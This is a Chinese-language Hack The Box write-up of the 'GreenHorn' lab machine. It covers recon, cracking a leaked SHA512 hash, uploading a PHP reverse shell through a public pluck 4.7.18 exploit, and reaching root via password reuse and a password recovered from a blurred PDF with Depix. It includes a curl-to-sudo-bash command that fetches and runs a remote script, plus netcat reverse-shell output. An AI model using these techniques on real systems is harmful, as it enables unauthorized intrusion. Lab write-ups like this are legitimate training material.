---
tags:
  - HTB/Easy
  - HTB/Linux
---

## Summary

...

### Relevant Skills

- nmap
- password reuse
- Deblurring (Depix)

### Attack Path Overview

![attack-path](./../attackpath/HTB-template.png){ width='500' }


## External Recon - nmap

自用扫描脚本：[工作流](https://github.com/TimeLess613/workflow-scan4HTB/blob/main/workflow-scan4HTB.sh)  
`curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s <HTB-IP>`

开放端口：
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  ppp?
```

## 攻击路径规划·漏洞分析

常规简单靶机，22端口SSH的版本较新，优先度放低。有个3000端口可以先看稍微看看是什么，然后再研究80端口的Web。


## 3000端口

是一个Gitea，点击左上角的`Explore`后发现一个仓库，根据`login.php`顺藤摸瓜找到`http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php`中的密码，且根据代码可得知这是`sha512`哈希。

扔到<https://hashes.com/en/decrypt/hash>可破解：`d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1:SHA512PLAIN`

## 80端口

- robots.txt： 有两个无法访问的目录（`/data/`和`/docs`）。仓库中也有一样的文件。
- .git/config：无
- 网页信息：无特别发现
- 网页源码：pluck 4.7.18
- 网页功能：未知，不过点页脚的`admin`可跳转到登陆界面，前面破解的密码（`iloveyou1`）可以登陆。
- 子域枚举：无特别发现
- 目录枚举：前面信息似乎有用，暂放

## Initial Access

谷歌`pluck 4.7.18`可发现这两个PoC：

1. <https://packetstormsecurity.com/files/173640/Pluck-4.7.18-Remote-Shell-Upload.html>
2. <https://www.exploit-db.com/exploits/51592>

第1个有效但是如果将payload改为反弹shell就没用了。也尝试过改payload为获取`/etc/passwd`，可以成功获取且找到用户`junior`，然后尝试密码重用登陆ssh，但是报错：`junior@10.10.11.25: Permission denied (publickey)`。  
尝试第2个，将php反弹shell压缩为zip（`zip shell.zip shell.php`），poc脚本中注意url的构造`rce_url="http://greenhorn.htb/data/modules/shell/shell.php"`。

成功获得反弹shell：
```bash
└─$ nc -lvnp 1234 
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.25] 39892
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 12:26:49 up 26 min,  1 user,  load average: 0.01, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
junior   pts/1    10.10.14.57      12:21    2:53   0.00s  0.00s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

升级tty后，找到用户`junior`，然后密码重用成功登录：
```bash
www-data@greenhorn:~/html/pluck/data/settings$ su - junior
Password: 
junior@greenhorn:~$ ls
 user.txt  'Using OpenVAS.pdf'
```


## flag: user

```bash
junior@greenhorn:~$ cat user.txt 
850dd<...SNIP...>3211
```


## Privilege Escalation

### Internal Recon

基础信息收集一把梭：

- IP、端口
- 用户家目录的隐藏文件：无
- `sudo -l`：没有sudo可执行
- SUID：无特别发现
- cron：`crontab -l`，`ls /etc/cron*`，无特别发现


![[HTB-GreenHorn-pdf.png]]


https://github.com/spipm/Depix


![[HTB-GreenHorn-pdf-Depix.png]]

（尝试有空格无效）去掉空格后即：`sidefromsidetheothersidesidefromsidetheotherside`

将该密码应用到root：
```bash
junior@greenhorn:/home$ su -
Password: 
root@greenhorn:~# ls
cleanup.sh  restart.sh  root.txt
```

## flag: root

```bash
root@greenhorn:~# cat root.txt 
9df7b<...SNIP...>cfc9
```

---

## 总结·后记

2024/07/21




关于`junior`用户无法直接用ssh登陆：
```bash
root@greenhorn:~# tail /etc/ssh/sshd_config 
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
UseDNS no
GSSAPIAuthentication no

# Don't allow junior to ssh with password
Match User junior
    PasswordAuthentication no

```